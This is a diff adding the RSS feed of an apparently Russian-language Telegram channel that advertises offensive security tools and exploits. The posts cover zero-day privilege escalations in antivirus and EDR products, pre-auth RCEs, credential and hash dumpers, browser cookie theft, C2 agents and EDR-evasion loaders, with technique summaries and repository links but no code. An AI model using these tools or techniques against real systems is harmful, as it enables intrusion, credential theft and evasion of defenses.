@@ -1,0 +1,1198 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Sat, 05 Sep 2026 10:26:19 +0000</lastBuildDate><item><title>M0nCrush</title><link>https://t.me/P0x3k_1N73LL1G3NC3/430</link><description>M0nCrush
+Kernel-mode process terminator using a signed BYOVD driver (MonProcessEX.sys). Works on all Windows 10/11. No offsets, no PDB. Rust.
+
+[Media: Видео]</description><pubDate>Sat, 05 Sep 2026 10:26:19 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_430</guid></item><item><title>VMware threat emulation techniques</title><link>https://t.me/P0x3k_1N73LL1G3NC3/429</link><description>VMware threat emulation techniques
+A reproducible catalogue of 86 atomic actions against vCenter, ESXi, SDDC Manager, and the wider VCF ecosystem — sourced from threat intelligence reporting, mapped to MITRE ATT&amp;CK, and paired with the log sources where evidence is expected.
+
+[Media: Фото]</description><pubDate>Fri, 04 Sep 2026 09:43:36 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_429</guid></item><item><title>Идем дальше</title><link>https://t.me/P0x3k_1N73LL1G3NC3/428</link><description>Идем дальше
+https://github.com/MSNightmare/FalconFlank
+Crowdstrike Falcon 0day LPE
+#lpe #ad #exploit #git
+
+[Media: Фото]</description><pubDate>Thu, 03 Sep 2026 06:52:16 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_428</guid></item><item><title>Exploit module for the recent PaperCut MF/NG 0day (CVE-2026-81578 + CVE-2026-82078)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/427</link><description>Exploit module for the recent PaperCut MF/NG 0day (CVE-2026-81578 + CVE-2026-82078)
+Module supports both MF and NG editions, and all supported product versions 26.x, 25.x, 24.x. Bypasses vendor emergency patch v1. Emergency patch v2 successfully remediates the chain. Module also has platform agnostic Java payload support (and that will be in-memory on 26.x targets), along with OS command based payloads.
+Blog: https://www.rapid7.com/blog/post/etr-papercut-ng-mf-critical-zero-day-exploited-in-the-wild/
+
+[Media: Фото]</description><pubDate>Tue, 01 Sep 2026 06:47:22 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_427</guid></item><item><title>PrettyPrague</title><link>https://t.me/P0x3k_1N73LL1G3NC3/426</link><description>PrettyPrague
+GenDigital Avast Antivirus ZeroDay Elevation of Privileges Vulnerability
+Another zeroday in an antimalware provider, I'm not sure but I believe this vulnerability affect other GenDigital products as well (such as AVG, Norton...)
+For now the PoC is compatible with any version of Avast Antivirus.
+The PoC will dump the SAM database by abusing a vulnerability in Avast Sandbox and spawn a full SYSTEM shell, at the time of writing this the PoC works with fully patched Avast Antivirus + Patched Windows 11 25H2
+
+[Media: Фото]</description><pubDate>Mon, 31 Aug 2026 04:07:32 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_426</guid></item><item><title>HardBreacher</title><link>https://t.me/P0x3k_1N73LL1G3NC3/425</link><description>HardBreacher
+Kaspersky Antivirus For Endpoint ZeroDay Elevation of Privileges Vulnerability
+
+[Media: Фото]</description><pubDate>Sat, 29 Aug 2026 08:56:58 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_425</guid></item><item><title>PRTremote</title><link>https://t.me/P0x3k_1N73LL1G3NC3/424</link><description>PRTremote
+Extract Primary Refresh Tokens (PRT) Cookies Remotely with InteractiveToken Scheduled Tasks
+Blog: https://www.armadin.com/blog-posts/prtremote-extract-prt-cookies-remotely-with-interactivetoken-scheduled-task
+
+[Media: Фото]</description><pubDate>Thu, 27 Aug 2026 17:37:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_424</guid></item><item><title>CrystalPotato</title><link>https://t.me/P0x3k_1N73LL1G3NC3/422</link><description>CrystalPotato
+A Crystal port of GodPotato, a local privilege escalation tool that abuses the DCOM OXID Resolver and named pipe impersonation to escalate from service accounts with SeImpersonatePrivilege to NT AUTHORITY\SYSTEM.
+The main contribution of this port beyond the language change is a set of OPSEC improvements designed to reduce the binary’s signature surface.
+Blog: https://ricardojoserf.github.io/crystalpotato/
+• GodPotato - Original C#
+• RustPotato - Rust implementation
+• SigmaPotato - C# implementation
+
+[Media: Фото]</description><pubDate>Mon, 24 Aug 2026 13:08:23 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_422</guid></item><item><title>SSHDESK</title><link>https://t.me/P0x3k_1N73LL1G3NC3/421</link><description>SSHDESK
+A full interactive remote desktop delivered entirely through SSH and displayed directly in your terminal. OpenSSH authenticates the user and launches SSHDESK as a forced command. The active graphical desktop then appears inside that same terminal. Keyboard, mouse, resize events, changed pixels, and session cleanup all travel through the one SSH PTY. There is no browser, custom SSH client, VNC/RDP listener, second password database, web server, or additional network port.
+
+[Media: Видео]</description><pubDate>Fri, 21 Aug 2026 08:41:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_421</guid></item><item><title>Synology-Inventory-Decryptor</title><link>https://t.me/P0x3k_1N73LL1G3NC3/420</link><description>Synology-Inventory-Decryptor
+A post-exploitation tool that instantly decrypts all credentials stored in Synology Active Backup for Business (ABB) config.db, yielding plaintext passwords for ESXi, vCenter, Hyper-V, Windows/Linux servers, MSSQL, and Oracle databases. Tested only on a Synology DS920+ NAS.
+Blog: https://blog.offseclabs.tech/posts/synology-active-backup-decrypting-inventory-credentials/
+
+[Media: Фото]</description><pubDate>Wed, 19 Aug 2026 17:51:22 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_420</guid></item><item><title>BOFScale</title><link>https://t.me/P0x3k_1N73LL1G3NC3/419</link><description>BOFScale
+A collection of BOF-PE's that allow running tailscale from memory. A CDN-fronted tailnet from a BOF-PE. The entire Tailscale daemon runs inside the implant process with no driver, no service, no disk state, and no child processes. Traffic relays over standard RFC 6455 WebSockets, so both DERP relay servers and the control plane can sit behind CloudFront or Fastly without any special handling.
+Blog: https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/
+
+[Media: Фото]</description><pubDate>Wed, 19 Aug 2026 17:40:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_419</guid></item><item><title>NachoMDM - Weaponising Windows MDM for UAC Bypass and SYSTEM Execution via Malicious Enrollment</title><link>https://t.me/P0x3k_1N73LL1G3NC3/418</link><description>NachoMDM - Weaponising Windows MDM for UAC Bypass and SYSTEM Execution via Malicious Enrollment
+In this post, we detail our research into the Windows MDM enrolment protocol and demonstrate how a malicious MDM server can be weaponized to achieve a User Account Control (UAC) bypass and silent NT AUTHORITY\SYSTEM code execution with two clicks. By coaxing a user who is a member of the local administrators group into enrolling their device, an attacker can fully compromise the endpoint without triggering any UAC prompts.
+POC: https://github.com/AmberWolfCyber/NachoMDM
+
+[Media: Видео]</description><pubDate>Wed, 19 Aug 2026 11:08:05 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_418</guid></item><item><title>🔒 Citrix NetScaler Pre-Auth RCE (CVE-2026-8452)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/417</link><description>🔒 Citrix NetScaler Pre-Auth RCE (CVE-2026-8452)
+Unauthenticated heap overflow in SAML signature canonicalization. An oversized PrefixList inside the &lt;ds:SignedInfo&gt; InclusiveNamespaces element overflows a fixed-size buffer, corrupting adjacent nsb chunk metadata. This yields a write-what-where primitive (controlled memcpy src/dst), allowing overwrite of tx_pkt_complete_fptr and jump to attacker shellcode on the executable heap. Results in root RCE when NetScaler is configured as SAML SP or IdP.
+Affected: NetScaler ADC/Gateway 14.1 &lt; 14.1-72.61 and 13.1 &lt; 13.1-63.18
+🔗 Research:
+https://labs.watchtowr.com/youre-back-in-the-room-citrix-netscaler-pre-auth-rce-cve-2026-8452/
+🔗 Source:
+https://github.com/watchtowrlabs/watchTowr-vs-Citrix-Netscaler-PreAuth-RCE-CVE-2026-8452
+#citrix #netscaler #rce #preauth #saml #heapoverflow
+
+[Media: Фото]</description><pubDate>Mon, 17 Aug 2026 07:32:14 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_417</guid></item><item><title>SCCM-CVE-2026-47301-Remote-Code-Execution</title><link>https://t.me/P0x3k_1N73LL1G3NC3/416</link><description>SCCM-CVE-2026-47301-Remote-Code-Execution
+Exploit chain (CVE-2026-47301) for Microsoft Configuration Manager (SCCM), combining a broken access, CAB arbitrary-write path traversal, certificate verification bypass, and DLL hijacking to achieve SYSTEM-level code execution.
+Blog: Microsoft Configuration Manager RCE 0-Day Exploit Chain (SCCM 𝗖𝗩𝗘-𝟮𝟬𝟮𝟲-𝟰𝟳𝟯𝟬𝟭)
+
+[Media: Фото]</description><pubDate>Sun, 16 Aug 2026 10:35:35 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_416</guid></item><item><title>ChromeAlone_Transforming_a_Browser_into_a_C2_Slides_DEFCON_33_Slides.pdf</title><link>https://t.me/P0x3k_1N73LL1G3NC3/415</link><description>ChromeAlone_Transforming_a_Browser_into_a_C2_Slides_DEFCON_33_Slides.pdf
+
+[Media: Фото]</description><pubDate>Sat, 15 Aug 2026 07:31:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_415</guid></item><item><title>VsockDrop</title><link>https://t.me/P0x3k_1N73LL1G3NC3/414</link><description>VsockDrop
+Linux kernel LPE via an io_uring zerocopy page-refcount underflow over AF_VSOCK. (CVE-2026-53365) Bug affects Linux 6.7 -&gt; 7.0.10, fixed in 7.0.11.
+Tested on unpatched Ubuntu 22.04 HWE/24.04/26.04, Debian 13, Arch, and openSUSE Leap/Tumbleweed.
+
+[Media: Фото]</description><pubDate>Fri, 14 Aug 2026 13:17:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_414</guid></item><item><title>Dark Agent</title><link>https://t.me/P0x3k_1N73LL1G3NC3/413</link><description>Dark Agent
+Fully-featured Mythic C2 Agent for Linux and macOS environments. Built in Crystal with statically-linked OpenSSL, it provides comprehensive post-exploitation capabilities through COFF/BOF loading, extensive system commands, SOCKS proxy support, and flexible communication profiles.
+Blog: https://minorimpact.dev/posts/dark-agent-coff-loader/
+
+[Media: Фото]</description><pubDate>Fri, 14 Aug 2026 09:55:30 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_413</guid></item><item><title>CDP-Enable-BOF</title><link>https://t.me/P0x3k_1N73LL1G3NC3/412</link><description>CDP-Enable-BOF
+After enabling CDP, you can use CDP-Toolkit to connect to the endpoint directly or through a SOCKS proxy. Its commands support enumerating open tabs, searching browser history, extracting cookies and saved passwords, capturing screenshots, listing bookmarks, managing extensions, and navigating the browser to specified websites via the Chrome DevTools Protocol APIs.
+CDP-Toolkit
+Commands:
+discover
+tabs list
+tabs screenshot
+cookies dump
+bookmarks list
+history search
+saved-passwords list
+saved-passwords dump
+extensions list
+extensions load
+page new
+page snapshot
+page close
+contexts list
+contexts dispose
+browser-takeover screencast
+browser-takeover proxy
+Blog: Return of the Cookie Monster
+This post explores enabling the Chrome DevTools Protocol (CDP) inside a running Chromium browser to perform post-ex activities such as browser enumeration, cookie theft, and browser takeover
+
+[Media: Фото]</description><pubDate>Fri, 14 Aug 2026 09:02:13 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_412</guid></item><item><title>VHDVomit</title><link>https://t.me/P0x3k_1N73LL1G3NC3/410</link><description>VHDVomit
+A tool to search SMB shares for VHD/VMDK/VHDX backup files, mount them and dump sensitive data including NTDS.dit, SYSTEM, and SAM hives.
+vbkVomit
+Extract hashes from Veeam .vbk backup. Reads the VBK directly, finds the NTFS volume inside, walks the MFT, reassembles ntds.dit + SAM/SECURITY/SYSTEM, and runs impacket secretsdump.
+VeeamThief
+Rogue vSphere server for capturing Veeam Backup &amp; Replication credentials.
+Blog: https://adversaryco.com/blog/breaking-bad-backups
+
+[Media: Фото]</description><pubDate>Thu, 13 Aug 2026 08:41:10 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_410</guid></item><item><title>Он опять это сделал)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/409</link><description>Он опять это сделал)
+https://github.com/MSNightmare/ShieldBreak
+Windows Defender LPE 0day
+#lpe #ad #exploit #git
+
+[Media: Фото]</description><pubDate>Wed, 12 Aug 2026 07:42:46 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_409</guid></item><item><title>Microsoft SharePoint JWT Token Authentication Bypass (CVE-2026-55040)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/408</link><description>Microsoft SharePoint JWT Token Authentication Bypass (CVE-2026-55040)
+A remote unauthenticated attacker can leverage CVE-2026-55040 to bypass authentication on a vulnerable SharePoint server, and perform operations as a SharePoint site user or administrator. The vulnerability is due to several issues in the JWT token validation pipeline.
+Blog: https://www.rapid7.com/blog/post/ra-microsoft-sharepoint-jwt-token-authentication-bypass-cve-2026-55040/
+
+[Media: Фото]</description><pubDate>Tue, 11 Aug 2026 19:14:07 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_408</guid></item><item><title>https://t.me/boost/P0x3k_1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3/407</link><description>https://t.me/boost/P0x3k_1N73LL1G3NC3
+
+[Media: Фото]</description><pubDate>Tue, 11 Aug 2026 14:50:15 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_407</guid></item><item><title>Plug &amp; Pwn: Weaponizing Windows PnP</title><link>https://t.me/P0x3k_1N73LL1G3NC3/406</link><description>Plug &amp; Pwn: Weaponizing Windows PnP
+Every time a USB device is plugged into a Windows machine, the operating system may silently download a package from Microsoft and execute vendor code as NT AUTHORITY\SYSTEM. That can happen without administrator privileges, without a logged-on user, and in some environments even remotely through RDP USB redirection.
+
+[Media: Видео]</description><pubDate>Sat, 08 Aug 2026 16:43:29 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_406</guid></item><item><title>Unauthenticated Remote Code Execution in JetBrains TeamCity (CVE-2026-63077)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/405</link><description>Unauthenticated Remote Code Execution in JetBrains TeamCity (CVE-2026-63077)
+Blog: https://www.rapid7.com/blog/post/ra-unauthenticated-rce-in-jetbrains-teamcity-cve-2026-63077/
+
+[Media: Фото]</description><pubDate>Sat, 08 Aug 2026 09:50:32 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_405</guid></item><item><title>Nocturne</title><link>https://t.me/P0x3k_1N73LL1G3NC3/404</link><description>Nocturne
+A CET-compatible Windows x64 loader that produces fully backed call stacks through runtime function table manipulation, code cave injection, and inverted function table collapse.
+
+[Media: Фото]</description><pubDate>Sat, 08 Aug 2026 08:04:51 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_404</guid></item><item><title>ResetNightmare</title><link>https://t.me/P0x3k_1N73LL1G3NC3/403</link><description>ResetNightmare
+ResetNightmare (CVE-2026-27912) is a validation flaw in the Kerberos Change Password protocol that allows for resetting the password of any target user/computer account, without knowing the current one. The attack requires an unpatched domain controller, and the ability to write a userPrincipalName (UPN) on any account you control. Alternatively, the vulnerability can also be abused by an attacker having the ability to create new users/computers in any OU, as creating a user/computer allows you to get GenericWrite permissions over it.
+Blog: Identity Crisis: Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover
+
+[Media: Фото]</description><pubDate>Fri, 07 Aug 2026 10:44:30 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_403</guid></item><item><title>Vipere</title><link>https://t.me/P0x3k_1N73LL1G3NC3/402</link><description>Vipere
+BOF exploiting the Visual Studio Installer Elevation Service for SYSTEM LPE and persistence via AppDomainManager hijacking, with native ETW evasion. For Cobalt Strike &amp; Adaptix.
+Tasted On:
+• Windows 11 25H2 Build 26200 (July 2026: fully patched)
+• Visual Studio 2022 Build Tools 17.x
+• Windows Defender (current definitions)
+
+[Media: Видео]</description><pubDate>Fri, 07 Aug 2026 09:15:10 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_402</guid></item><item><title>Forget PSEXEC: DCOM Upload &amp; Execute Backdoor</title><link>https://t.me/P0x3k_1N73LL1G3NC3/401</link><description>Forget PSEXEC: DCOM Upload &amp; Execute Backdoor
+This blog post presents a powerful new DCOM lateral movement attack that allows the writing of custom DLLs to a target machine, loading them to a service, and executing their functionality with arbitrary parameters. This backdoor-like attack abuses the IMsiServer COM interface by reversing its internals. This process is described step-by-step in this blog.
+PoC: DCOMUploadExec
+
+[Media: Фото]</description><pubDate>Fri, 07 Aug 2026 06:45:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_401</guid></item><item><title>Five games. One signed driver. SYSTEM compromise.</title><link>https://t.me/P0x3k_1N73LL1G3NC3/400</link><description>Five games. One signed driver. SYSTEM compromise.
+Black Desert, Lineage II, AION, MapleStory, and Blade &amp; Soul install Wellbia's driver - letting any process dump LSASS, kill Defender, or pop a SYSTEM shell
+Exploit: https://github.com/BlackSnufkin/AxHunter
+• dump — LDR-walks lsass.exe, recovers BCrypt 3DES key + IV, decrypts LogonSessionList, extracts NT/SHA1 hashes and (where present) WDigest plaintext.
+• kill — cmd 785 handle on the target, enumerates target's handle table via NtQuerySystemInformation(SystemExtendedHandleInformation), then cmd 800 (ObSetHandleAttributes(KernelMode) + ZwClose under KeStackAttachProcess) on each handle.
+• lpe — WinExec("cmd.exe", SW_SHOW). Child inherits winlogon's NT AUTHORITY\SYSTEM token + Session 1.
+Blog:
+• Hunting the Hunter: A Live Kernel LPE 0day in Anti-Cheat on a Billion Machines
+• Hunting the Hunter II: Reversing xhunter2.sys and Its Three-Layer Authentication
+Windows 11 24H2 build 26200. HVCI, VBS, Microsoft Vulnerable Driver Blocklist all enabled.
+
+[Media: Видео]</description><pubDate>Sat, 08 Aug 2026 09:43:50 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_400</guid></item><item><title>CVE-2026-57239 Foxit PDF Reader LPE</title><link>https://t.me/P0x3k_1N73LL1G3NC3/399</link><description>CVE-2026-57239 Foxit PDF Reader LPE
+Exploit which lets you obtain NT AUTHORITY\SYSTEM rights via the Foxit PDF Reader updater service.
+Blog: Escalating All The Privileges With Foxit PDF Reader (CVE-2026–57239)
+
+[Media: Фото]</description><pubDate>Fri, 31 Jul 2026 18:25:25 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_399</guid></item><item><title>Ruby on Rails Active Storage Vips RCE (CVE-2026-66066)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/398</link><description>Ruby on Rails Active Storage Vips RCE (CVE-2026-66066)
+Target Software/Hardware:
+Ruby on Rails 6.0.6.1, 6.1.7.10, 8.0.5, and 8.0.5.1, Active Storage with Vips variant processor, Ruby 3.2, image_processing 1.14.0, ruby-vips ~&gt; 2.2, libvips 8.16.1 built with -Dmatio=enabled
+
+[Media: Видео]</description><pubDate>Fri, 31 Jul 2026 18:08:29 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_398</guid></item><item><title>Check Point SmartConsole Authentication Bypass (CVE-2026-16232)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/397</link><description>Check Point SmartConsole Authentication Bypass (CVE-2026-16232)
+Authentication bypass via the SmartConsole login process using an application token. This affects Check Point Security Management Server and Multi-Domain Security Management Server (MDS).
+Metasploit module: https://github.com/rapid7/metasploit-framework/pull/21731
+Blog: https://www.rapid7.com/blog/post/ra-check-point-smartconsole-authentication-bypass-technical-analysis-cve-2026-16232/
+
+[Media: Фото]</description><pubDate>Wed, 29 Jul 2026 04:26:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_397</guid></item><item><title>🔒 Certighost (CVE-2026-54121) — AD CS Domain Controller Impersonation</title><link>https://t.me/P0x3k_1N73LL1G3NC3/396</link><description>🔒 Certighost (CVE-2026-54121) — AD CS Domain Controller Impersonation
+Low-privileged domain user can impersonate a Domain Controller via an AD CS enrollment chase fallback. By supplying cdc (Client DC) and rmd (Remote Domain) request attributes, an attacker forces the Enterprise CA to query an attacker-controlled host over SMB and LDAP.
+The CA then blindly trusts the returned directory objects (objectSid + dNSHostName of a real DC) and issues a certificate containing strong identity mapping for the Domain Controller. This allows successful PKINIT authentication as the DC.
+🔗 Research:
+https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26
+🔗 Source:
+https://github.com/aniqfakhrul/CVE-2026-54121
+#ad #adcs #pkinit #machineaccountquota
+
+[Media: Фото]</description><pubDate>Fri, 24 Jul 2026 08:56:54 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_396</guid></item><item><title>HiveOracle</title><link>https://t.me/P0x3k_1N73LL1G3NC3/395</link><description>HiveOracle
+Pull locked hives (SAM/SYSTEM/etc) off disk without touching LSASS, then offline hash dump.
+
+[Media: Фото]</description><pubDate>Thu, 23 Jul 2026 04:05:14 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_395</guid></item><item><title>CVE-2026-36425 aka Arbitrary Process termination (BYOVD)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/394</link><description>CVE-2026-36425 aka Arbitrary Process termination (BYOVD)
+CVE-2026-36425 OPSWAT AppRemover (ardrv.sys) improper access control advisory
+Analysis
+
+[Media: Фото]</description><pubDate>Mon, 20 Jul 2026 20:49:26 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_394</guid></item><item><title>WordPress Core "wp2shell" RCE</title><link>https://t.me/P0x3k_1N73LL1G3NC3/393</link><description>WordPress Core "wp2shell" RCE
+The attack consists of two flaws, tracked as CVE-2026-63030 and CVE-2026-60137, that can be chained together to achieve pre-authentication remote code execution against WordPress installs running versions 6.9.x and 7.0.x.
+
+[Media: Видео]</description><pubDate>Sat, 18 Jul 2026 17:48:45 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_393</guid></item><item><title>There and Back Again: An Operators Guide on NTLM Relaying Egress</title><link>https://t.me/P0x3k_1N73LL1G3NC3/392</link><description>There and Back Again: An Operators Guide on NTLM Relaying Egress
+This technique is especially impactful when escalation isn’t possible to bind to port 445/TCP for SMB relays or firewall rules are preventing a WebDAV relay when operating from C2. It involves coercing either SMB or WebDAV authentication outbound, catching the authentication using a cloud host on the internet, and relaying the traffic back through red team infrastructure into the target environment.
+
+[Media: Фото]</description><pubDate>Sat, 18 Jul 2026 08:59:55 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_392</guid></item><item><title>LegacyHive : Windows user profile service arbitrary hive load elevation of privileges vulnerability</title><link>https://t.me/P0x3k_1N73LL1G3NC3/391</link><description>LegacyHive : Windows user profile service arbitrary hive load elevation of privileges vulnerability
+The PoC requires another standard user credentials and a third username (which can be an administrator account), if the PoC is successful, it will end up mounting the target user hive in current user classes root.
+The PoC was stripped down as an attempt to prevent public exploitation, the original PoC did not require additional user credential and was not limited to usrclass.dat hive, any hive could be loaded using this vulnerability but you would need some brain cells to make the PoC do it.
+
+[Media: Фото]</description><pubDate>Wed, 15 Jul 2026 15:26:59 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_391</guid></item><item><title>COMLoaderAstharot</title><link>https://t.me/P0x3k_1N73LL1G3NC3/390</link><description>COMLoaderAstharot
+COM Hijack for CLSID {9FC8E510-A27C-4B3B-B9A3-BF65F00256A8} (chrome and msedge)
+
+[Media: Фото]</description><pubDate>Wed, 15 Jul 2026 04:35:11 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_390</guid></item><item><title>https://t.me/boost/P0x3k_1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3/389</link><description>https://t.me/boost/P0x3k_1N73LL1G3NC3
+
+[Media: Фото]</description><pubDate>Sat, 11 Jul 2026 06:37:26 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_389</guid></item><item><title>💉 P³ — Shellcode Loader: Process Parameter Poisoning</title><link>https://t.me/P0x3k_1N73LL1G3NC3/388</link><description>💉 P³ — Shellcode Loader: Process Parameter Poisoning
+This loader implements a code injection technique that leverages the Windows Process Parameters structure (PEB) as a staging and execution location for remote shellcode injection.
+By passing payload data implicitly through standard parameters like CommandLine, Environment, or ShellInfo, it bypasses EDR detection because it doesn't touch heavily monitored APIs like VirtualAllocEx, WriteProcessMemory, or CreateRemoteThread. Since it runs without spawning suspended processes or relying on process hollowing, it leaves virtually no obvious footprint in the system.
+🔗 Research:
+https://sensepost.com/blog/2026/process-parameter-poisoning/
+🔗 Source:
+https://github.com/Orange-Cyberdefense/p3-loader/
+#maldev #injection #edr #bypass #windows #peb
+
+[Media: Фото]</description><pubDate>Thu, 09 Jul 2026 20:14:17 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_388</guid></item><item><title>GhostLock — CVE-2026-43499</title><link>https://t.me/P0x3k_1N73LL1G3NC3/387</link><description>GhostLock — CVE-2026-43499
+This is a Linux kernel vulnerability found by VEGA that exists in every major distribution since 2011. Triggering the bug does not require any special kernel config or privilege. By turning it into a 97% stable privilege escalation and container escape, Google has rewarded us $92,337 in kernelCTF. This writeup covers the technical details of the exploit.
+🔗 Research:
+https://nebusec.ai/research/ionstack-part-2/
+🔗 Exploit:
+https://github.com/NebuSec/CyberMeowfia/tree/main/IonStack/CVE-2026-43499
+#linux #kernel #lpe #container #escape
+
+[Media: Видео]</description><pubDate>Wed, 08 Jul 2026 16:18:24 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_387</guid></item><item><title>Klist2ccache</title><link>https://t.me/P0x3k_1N73LL1G3NC3/386</link><description>Klist2ccache
+Dump TGTs remotely and convert Windows' klist binary output to ccache format for use with impacket and other Linux Kerberos tooling. klistremote — via Task Scheduler + SMB. klistwinrm — via WinRM.
+Blog: https://jakeotte.com/posts/klist-revisited.html
+
+[Media: Фото]</description><pubDate>Wed, 08 Jul 2026 08:44:28 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_386</guid></item><item><title>Linux LPE Toolkit</title><link>https://t.me/P0x3k_1N73LL1G3NC3/385</link><description>Linux LPE Toolkit
+Multi-architecture privilege escalation toolkit with 24 exploits (amd64 pre-built; other architectures compiled via gcc at runtime). Supports amd64, arm64, 386, mips, mipsle, mips64, and mips64le. Detects kernel version, filters patched exploits, and tries each in order until root is obtained.
+
+[Media: Фото]</description><pubDate>Tue, 07 Jul 2026 03:58:19 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_385</guid></item><item><title>Linux LPE IPV6_FRAG_ESCAPE: a unprivileged container / jail escape PoC</title><link>https://t.me/P0x3k_1N73LL1G3NC3/384</link><description>Linux LPE IPV6_FRAG_ESCAPE: a unprivileged container / jail escape PoC
+The flaw sits in __ip6_append_data() and corrupts a packet’s own skb_shared_info. Affects CentOS 10 and RedHat
+Blog: https://www.linkedin.com/pulse/ipv6fragescape-unprivileged-container-jail-escape-poc-oldani-xbewf
+
+[Media: Фото]</description><pubDate>Mon, 29 Jun 2026 09:32:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_384</guid></item><item><title>GitRunner-C2</title><link>https://t.me/P0x3k_1N73LL1G3NC3/382</link><description>GitRunner-C2
+C2 framework abusing GitLab self-hosted runners as implants — Vue 3 operator UI, NGINX proxy, full file transfer and detection coverage.
+Blog: https://vrls.ws/posts/abusing-gitlab-ci-runners-as-c2/
+
+[Media: Фото]</description><pubDate>Sun, 28 Jun 2026 13:27:59 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_382</guid></item><item><title>DirtyClone — CVE-2026-43503</title><link>https://t.me/P0x3k_1N73LL1G3NC3/381</link><description>DirtyClone — CVE-2026-43503
+A Linux kernel local privilege escalation and page-cache write. DirtyClone is the fourth public member of the DirtyPipe / DirtyFrag family: it forces the kernel to run an in-place ESP (IPsec) decrypt over a file-backed page-cache page the attacker only has read access to, mutating that page in RAM. With the AES-CBC key/IV chosen so the decrypt writes attacker-controlled bytes, /usr/bin/su is rewritten with a tiny setuid(0)+execve("/bin/sh") ELF and invoking it yields root.
+🔗 Research:
+https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/
+🔗 Exploit:
+https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone
+#linux #lpe #kernel #dirty
+
+[Media: Видео]</description><pubDate>Fri, 26 Jun 2026 17:38:20 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_381</guid></item><item><title>Entropia</title><link>https://t.me/P0x3k_1N73LL1G3NC3/380</link><description>Entropia
+A compiled language for Windows position-independent x86-64 shellcode and Beacon Object Files.
+
